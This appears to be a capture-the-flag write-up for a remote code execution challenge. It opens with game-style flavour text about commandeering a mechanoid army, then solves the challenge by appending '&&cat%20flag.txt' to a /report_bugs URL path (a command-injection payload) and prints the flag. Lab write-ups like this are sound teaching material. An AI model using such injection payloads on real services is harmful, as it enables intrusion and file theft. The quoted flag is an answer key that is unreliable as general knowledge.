# DESCRIPTION
Success! You now hold the reins to the mechanoid army. With the press of a button, you command them to cease their attack. But why stop there? These machines can be more than just neutralized—they can be repurposed. You send new orders, converting them into your allies. The mechanoids turn on their former masters, fighting by your side. The battlefield is yours to command.

# WRITEUP

RCE challenge. Go to `/report_bugs` endpoint. Put a dummy message, followed by `&&cat%20flag.txt` to get flag.

For example: `/report_bugs/hereisabug&&cat%20flag.txt`

>OASIS{M0v1ng_f0rw4rd_0n3_f1l3_4t_a_t1me}
